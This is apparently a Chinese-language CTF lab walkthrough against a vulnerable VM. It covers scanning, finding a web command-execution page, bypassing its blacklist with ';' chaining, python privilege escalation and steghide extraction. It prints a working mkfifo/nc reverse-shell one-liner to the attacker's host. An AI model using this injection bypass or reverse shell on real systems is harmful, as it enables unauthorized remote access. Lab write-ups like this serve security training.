# 靶机环境

Kali：192.168.108.144

靶机：192.168.108.178

# 主机发现

使用命令 netdiscover -r 192.168.108.0/24 寻找靶机 IP。

# 信息收集

使用 nmap 扫一下目标 IP 的端口，发现开放了 21，22，80 端口。

先看下 80 端口的 Web 服务（网页还挺好看：)），点点之后发现，这网页没什么功能。

使用 nikto -host http://192.168.108.178 扫描没发现什么漏洞。

再用 dirb 进行目录扫描，发现 secret/index.php 页面。嘿！命令执行窗口？

# 漏洞利用

简单输入 ls、id 等命令后发现，网页对个别命令做了限制，会返回不同的页面。

使用 burpsuite 抓到 POST 数据包，发送到暴破模块，载入 linux 命令字典进行 fuzz，能发现大部分命令可用，可以断定该网页对用户的输入做了黑名单过滤，还注意到 python 命令也被列入黑名单了，估计后面会用到，并且 ifconfig 命令下能看到 docker 网卡。

经测试发现类似 id;ls 的命令可以绕过过滤。

# getshell

命令执行页面可以绕过，尝试反弹 shell。

kali 使用命令 nc -lvp 7777 监听 7777 端口。常见的反弹 shell 语句在这失效了。所以安利一个小工具：https://weibell.github.io/reverse-shell-generator/

经过测试命令 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.108.144 7777 >/tmp/f 可以反弹 shell。

# 提权

拿到的是用户 www-data 的 shell，权限很低，所以考虑提权。

刚刚测试过程中发现靶机是安装有 python 的，可以通过 python 进行提权。

执行成功。翻看目录发现下面这个图片，应该是 ctf 里面常见的隐写。

kali 使用 binwalk 查看是否隐写了别的文件。

硬着头皮翻资料，发现可以用 steghide 工具查看图片内的文件。存在 backup.zip 文件。

使用 steghide 分离出 zip 文件。
